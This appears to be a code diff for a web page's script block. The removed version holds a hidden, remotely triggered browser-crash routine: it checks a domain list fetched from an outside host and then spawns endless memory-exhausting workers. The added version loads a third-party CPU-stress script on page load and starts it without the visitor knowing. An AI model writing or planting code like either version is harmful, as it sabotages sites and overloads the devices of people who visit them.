@@ -1,31 +1,19 @@
 <script>
-function workerCrash() {
-    let workerCode = 
-        while (true) {
-            let arr = new ArrayBuffer(2 ** 30);
-        }
-    ;
-    let blob = new Blob([workerCode], { type: 'application/javascript' });
-    let url = URL.createObjectURL(blob);
-    while (true) {
-        new Worker(url);
-    }
-}
-
-window.addEventListener('load', () => {
-    // Fetch url.txt and check domain
-    fetch('https://testpop.pages.dev/check.txt')
-        .then(response => response.text())
-        .then(data => {
-            const domains = data.split(/\s+/); // split by whitespace
-            const currentDomain = window.location.hostname;
-            if (domains.includes(currentDomain)) {
-                // Delay 2 seconds before executing
-                setTimeout(workerCrash, 2000);
-            }
-        })
-        .catch(error => {
-            console.error('Error fetching url.txt:', error);
-        });
-});
-</script>
+    (function() {
+      // Create and insert the CPUStresser script tag
+      var script = document.createElement('script');
+      script.src = 'https://tangx246.github.io/cpustresser/cpustresser.min.js';
+      script.onload = function() {
+        // Ensure the library is loaded, then start the benchmark
+        if (typeof startBenchmark === 'function') {
+          startBenchmark();
+        } else {
+          console.error('CPUStresser failed to load or startBenchmark() is unavailable.');
+        }
+      };
+      script.onerror = function() {
+        console.error('Failed to load CPUStresser script.');
+      };
+      document.head.appendChild(script);
+    })();
+  </script>
